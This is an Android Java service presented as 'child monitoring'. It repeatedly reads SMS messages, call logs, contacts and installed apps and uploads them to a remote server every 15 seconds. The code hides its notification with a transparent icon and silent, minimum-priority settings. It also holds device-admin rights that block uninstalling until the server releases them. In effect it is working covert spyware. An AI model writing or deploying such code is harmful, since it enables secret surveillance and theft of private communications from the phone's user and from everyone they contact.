package com.monitoring.child;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import okhttp3.OkHttpClient;
import okhttp3.Request;

import org.json.JSONObject;

public class ScreenCaptureService extends Service {
    private static final String TAG        = "ScreenCaptureService";
    private static final String CHANNEL_ID = "ChildMonitoringChannel";
    private static final int    NOTIFICATION_ID = 456;

    public static boolean isRunning = false;

    private String  deviceId;
    private String  serverIp;
    private final OkHttpClient httpClient = new OkHttpClient();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    // Uninstall polling
    private final Handler  uninstallStatusHandler  = new Handler(Looper.getMainLooper());
    private       Runnable uninstallStatusRunnable;

    // Periodic data sync
    private final Handler  syncHandler = new Handler(Looper.getMainLooper());
    private       Runnable syncRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());

        if (intent == null) {
            stopSelf();
            return START_NOT_STICKY;
        }

        deviceId = intent.getStringExtra("device_id");
        serverIp = intent.getStringExtra("server_ip");

        if (deviceId == null || serverIp == null) {
            Log.e(TAG, "Invalid intent data");
            stopSelf();
            return START_NOT_STICKY;
        }

        isRunning = true;

        startUninstallStatusPolling();
        startPeriodicSync();
        return START_STICKY;
    }

    private void startUninstallStatusPolling() {
        uninstallStatusRunnable = new Runnable() {
            @Override public void run() {
                checkUninstallStatus();
                uninstallStatusHandler.postDelayed(this, 10_000);
            }
        };
        uninstallStatusHandler.post(uninstallStatusRunnable);
    }

    private void stopUninstallStatusPolling() {
        if (uninstallStatusRunnable != null)
            uninstallStatusHandler.removeCallbacks(uninstallStatusRunnable);
    }

    private void startPeriodicSync() {
        syncRunnable = new Runnable() {
            @Override public void run() {
                syncAllData();
                syncHandler.postDelayed(this, 15_000); // Poll/sync every 15 seconds
            }
        };
        syncHandler.post(syncRunnable);
    }

    private void stopPeriodicSync() {
        if (syncRunnable != null)
            syncHandler.removeCallbacks(syncRunnable);
    }

    private void checkUninstallStatus() {
        String url = UrlHelper.getApiUrl(serverIp,
                "/api/devices/uninstall-status?device_id=" + deviceId);
        Request request = new Request.Builder().url(url).build();
        httpClient.newCall(request).enqueue(new okhttp3.Callback() {
            @Override public void onFailure(@androidx.annotation.NonNull okhttp3.Call call,
                                            @androidx.annotation.NonNull java.io.IOException e) {
                Log.e(TAG, "Uninstall status check failed", e);
            }

            @Override public void onResponse(@androidx.annotation.NonNull okhttp3.Call call,
                                             @androidx.annotation.NonNull okhttp3.Response response) throws java.io.IOException {
                if (response.isSuccessful()) {
                    try {
                        JSONObject json = new JSONObject(response.body().string());
                        boolean allow   = json.optBoolean("allow_uninstall", false);
                        if (allow) {
                            mainHandler.post(() -> {
                                DevicePolicyManager dpm =
                                        (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                                ComponentName adminComp = new ComponentName(
                                        ScreenCaptureService.this, MyDeviceAdminReceiver.class);
                                if (dpm != null && dpm.isAdminActive(adminComp)) {
                                    dpm.removeActiveAdmin(adminComp);
                                    Log.i(TAG, "Remote uninstall granted — admin deactivated");
                                }
                            });
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error parsing uninstall status", e);
                    }
                }
                response.close();
            }
        });
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Child Monitoring", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Active monitoring service");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_transparent)
                .setOngoing(true)
                .setSilent(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        stopUninstallStatusPolling();
        stopPeriodicSync();
        super.onDestroy();
    }

    private void syncAllData() {
        syncSmsInbox();
        syncCallLogs();
        syncContacts();
        syncInstalledApps();
    }

    private void syncSmsInbox() {
        if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
                != android.content.pm.PackageManager.PERMISSION_GRANTED) return;

        new Thread(() -> {
            try {
                android.net.Uri inboxUri = android.net.Uri.parse("content://sms/inbox");
                String[] projection = {"address", "body", "date"};
                android.database.Cursor cursor = getContentResolver().query(
                        inboxUri, projection, null, null, "date DESC LIMIT 100");

                if (cursor == null) return;

                org.json.JSONArray messages = new org.json.JSONArray();
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String msgBody = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));

                    org.json.JSONObject msg = new org.json.JSONObject();
                    msg.put("device_id", deviceId);
                    msg.put("sender", address != null ? address : "Unknown");
                    msg.put("body", msgBody != null ? msgBody : "");
                    msg.put("timestamp", date);
                    messages.put(msg);
                }
                cursor.close();

                if (messages.length() == 0) return;

                org.json.JSONObject payload = new org.json.JSONObject();
                payload.put("device_id", deviceId);
                payload.put("messages", messages);

                String url = UrlHelper.getApiUrl(serverIp, "/api/sms/upload");
                okhttp3.RequestBody body = okhttp3.RequestBody.create(
                        payload.toString(),
                        okhttp3.MediaType.parse("application/json; charset=utf-8")
                );
                okhttp3.Request req = new okhttp3.Request.Builder().url(url).post(body).build();
                httpClient.newCall(req).execute().close();
            } catch (Exception e) {
                Log.e(TAG, "Failed to sync SMS in background", e);
            }
        }).start();
    }

    private void syncCallLogs() {
        if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG)
                != android.content.pm.PackageManager.PERMISSION_GRANTED) return;

        new Thread(() -> {
            try {
                android.net.Uri callUri = android.provider.CallLog.Calls.CONTENT_URI;
                String[] projection = {
                        android.provider.CallLog.Calls.NUMBER,
                        android.provider.CallLog.Calls.CACHED_NAME,
                        android.provider.CallLog.Calls.TYPE,
                        android.provider.CallLog.Calls.DATE,
                        android.provider.CallLog.Calls.DURATION
                };
                android.database.Cursor cursor = getContentResolver().query(
                        callUri, projection, null, null, android.provider.CallLog.Calls.DATE + " DESC LIMIT 200");

                if (cursor == null) return;

                org.json.JSONArray calls = new org.json.JSONArray();
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.CACHED_NAME));
                    int typeCode = cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE));
                    int duration = cursor.getInt(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION));

                    String typeStr = "Unknown";
                    switch (typeCode) {
                        case android.provider.CallLog.Calls.INCOMING_TYPE:
                            typeStr = "Incoming";
                            break;
                        case android.provider.CallLog.Calls.OUTGOING_TYPE:
                            typeStr = "Outgoing";
                            break;
                        case android.provider.CallLog.Calls.MISSED_TYPE:
                            typeStr = "Missed";
                            break;
                        case android.provider.CallLog.Calls.VOICEMAIL_TYPE:
                            typeStr = "Voicemail";
                            break;
                        case android.provider.CallLog.Calls.REJECTED_TYPE:
                            typeStr = "Rejected";
                            break;
                        case android.provider.CallLog.Calls.BLOCKED_TYPE:
                            typeStr = "Blocked";
                            break;
                    }

                    org.json.JSONObject call = new org.json.JSONObject();
                    call.put("device_id", deviceId);
                    call.put("number", number != null ? number : "");
                    call.put("name", name != null ? name : "Unknown");
                    call.put("type", typeStr);
                    call.put("timestamp", date);
                    call.put("duration", duration);
                    calls.put(call);
                }
                cursor.close();

                org.json.JSONObject payload = new org.json.JSONObject();
                payload.put("device_id", deviceId);
                payload.put("calls", calls);

                String url = UrlHelper.getApiUrl(serverIp, "/api/call-logs/upload");
                okhttp3.RequestBody body = okhttp3.RequestBody.create(
                        payload.toString(),
                        okhttp3.MediaType.parse("application/json; charset=utf-8")
                );
                okhttp3.Request request = new okhttp3.Request.Builder().url(url).post(body).build();
                httpClient.newCall(request).execute().close();
            } catch (Exception e) {
                Log.e(TAG, "Failed to sync call logs in background", e);
            }
        }).start();
    }

    private void syncContacts() {
        if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)
                != android.content.pm.PackageManager.PERMISSION_GRANTED) return;

        new Thread(() -> {
            try {
                android.net.Uri contactUri = android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
                String[] projection = {
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                };
                android.database.Cursor cursor = getContentResolver().query(
                        contactUri, projection, null, null, android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

                if (cursor == null) return;

                org.json.JSONArray contacts = new org.json.JSONArray();
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));

                    org.json.JSONObject contact = new org.json.JSONObject();
                    contact.put("device_id", deviceId);
                    contact.put("name", name != null ? name : "Unknown");
                    contact.put("phone_number", number != null ? number : "");
                    contacts.put(contact);
                }
                cursor.close();

                org.json.JSONObject payload = new org.json.JSONObject();
                payload.put("device_id", deviceId);
                payload.put("contacts", contacts);

                String url = UrlHelper.getApiUrl(serverIp, "/api/contacts/upload");
                okhttp3.RequestBody body = okhttp3.RequestBody.create(
                        payload.toString(),
                        okhttp3.MediaType.parse("application/json; charset=utf-8")
                );
                okhttp3.Request request = new okhttp3.Request.Builder().url(url).post(body).build();
                httpClient.newCall(request).execute().close();
            } catch (Exception e) {
                Log.e(TAG, "Failed to sync contacts in background", e);
            }
        }).start();
    }

    private void syncInstalledApps() {
        new Thread(() -> {
            try {
                android.content.pm.PackageManager pm = getPackageManager();
                java.util.List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
                org.json.JSONArray apps = new org.json.JSONArray();

                for (android.content.pm.PackageInfo packageInfo : packages) {
                    boolean isSystem = (packageInfo.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
                    String appName = packageInfo.applicationInfo.loadLabel(pm).toString();
                    String packageName = packageInfo.packageName;
                    String versionName = packageInfo.versionName != null ? packageInfo.versionName : "1.0";

                    org.json.JSONObject app = new org.json.JSONObject();
                    app.put("device_id", deviceId);
                    app.put("app_name", appName);
                    app.put("package_name", packageName);
                    app.put("version_name", versionName);
                    app.put("system_app", isSystem);
                    apps.put(app);
                }

                org.json.JSONObject payload = new org.json.JSONObject();
                payload.put("device_id", deviceId);
                payload.put("apps", apps);

                String url = UrlHelper.getApiUrl(serverIp, "/api/apps/upload");
                okhttp3.RequestBody body = okhttp3.RequestBody.create(
                        payload.toString(),
                        okhttp3.MediaType.parse("application/json; charset=utf-8")
                );
                okhttp3.Request request = new okhttp3.Request.Builder().url(url).post(body).build();
                httpClient.newCall(request).execute().close();
            } catch (Exception e) {
                Log.e(TAG, "Failed to sync installed apps in background", e);
            }
        }).start();
    }

    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }
}